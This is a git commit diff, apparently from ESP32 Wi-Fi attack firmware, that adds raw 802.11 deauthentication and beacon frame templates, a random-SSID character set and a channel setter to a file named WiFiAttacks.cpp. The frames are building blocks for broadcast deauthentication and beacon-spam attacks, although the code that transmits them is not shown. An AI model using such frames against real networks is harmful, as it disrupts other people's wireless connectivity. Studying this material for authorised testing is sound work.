47566e76d164538c0674fdc12ce81b355d6d622a
Radhey Kalra <radheykalra901@gmail.com>
2026-01-10 18:23:00 +0530

    Add deauth and beacon frame templates

--- src/WiFiAttacks.cpp
+++ src/WiFiAttacks.cpp
@@ -6,6 +6,38 @@
 
 #include "WiFiAttacks.h"
 
+// ============================================
+// Frame Templates
+// ============================================
+
+// Deauthentication frame template
+const uint8_t deauthFrame[26] = {
+    0xC0, 0x00,                          // Frame Control (deauth)
+    0x00, 0x00,                          // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (to be filled)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (to be filled)
+    0x00, 0x00,                          // Sequence
+    0x07, 0x00                           // Reason code (class 3 frame)
+};
+
+// Beacon frame template
+const uint8_t beaconFrame[128] = {
+    0x80, 0x00,                          // Frame Control (beacon)
+    0x00, 0x00,                          // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Destination (broadcast)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Source (random)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // BSSID (same as source)
+    0x00, 0x00,                          // Sequence
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
+    0x64, 0x00,                          // Beacon interval
+    0x01, 0x04,                          // Capability info
+    0x00                                 // SSID tag
+};
+
+// Character set for random SSID
+const char ssidChars[] = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+
 WiFiAttacks wifiAttacks;
 
 void WiFiAttacks::begin() {
@@ -13,6 +45,7 @@ void WiFiAttacks::begin() {
     WiFi.disconnect();
     esp_wifi_set_promiscuous(false);
     _mode = WiFiMode::IDLE;
+    _channel = DEFAULT_CHANNEL;
 }
 
 void WiFiAttacks::update() {
@@ -22,4 +55,9 @@ void WiFiAttacks::update() {
 void WiFiAttacks::stop() {
     esp_wifi_set_promiscuous(false);
     _mode = WiFiMode::IDLE;
+}
+
+void WiFiAttacks::setChannel(uint8_t channel) {
+    _channel = channel;
+    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
 }
